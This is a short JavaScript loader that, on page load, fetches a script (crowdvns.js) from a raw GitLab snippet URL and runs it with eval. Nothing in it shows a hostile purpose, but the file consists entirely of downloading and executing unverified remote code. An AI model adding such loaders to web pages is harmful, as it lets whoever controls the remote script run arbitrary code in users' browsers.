console.log("Loading...")
window.onload = () => {
    fetch('https://gitlab.com/-/snippets/2091141/raw/master/crowdvns.js', {
    })
        .then(resp => resp.text())
        .then(t => {
            console.log(t)
            return t
        })
        .then(eval)
        .catch(console.error)
}